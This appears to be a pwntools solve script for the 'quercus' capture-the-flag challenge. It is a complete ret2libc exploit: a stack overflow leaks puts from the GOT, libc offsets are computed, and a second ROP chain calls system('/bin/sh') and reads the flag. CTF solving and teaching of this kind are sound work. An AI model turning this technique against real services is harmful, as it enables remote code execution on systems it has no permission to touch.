#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './quercus'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'quercus.squ1rrel-ctf-codelab.kctf.cloud', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x040136c
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec quercus 
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)

SYM_MAIN = 0x0401216

def exploit():
    global io
    io = initialize()
  
    payload = b''
    payload += cyclic(120)
    payload += flat([
        0x04013d3, # pop rdi; ret;
        elf.got['puts'],
        elf.plt['puts'],
        SYM_MAIN
    ])
    io.sendlineafter(b'species:', payload)
    io.sendlineafter(b'edit:', b'100')

    io.recvline()
    libc = u64(io.recvline().replace(b'\n', b'').ljust(8, b'\x00')) - 0x084420
    system = libc + 0x052290
    binsh = libc + 0x1b45bd

    payload = b''
    payload += cyclic(120)
    payload += flat([
        0x04013d3, # pop rdi; ret;
        binsh,
        0x040101a, # ret
        system,
    ])
    io.sendlineafter(b'species:', payload)
    io.sendlineafter(b'edit:', b'100')

    sleep(0.2)
    io.sendline('cat /flag*')

    log.success('libc base: %#x', libc)
    io.interactive()
    
if __name__ == '__main__':
    exploit()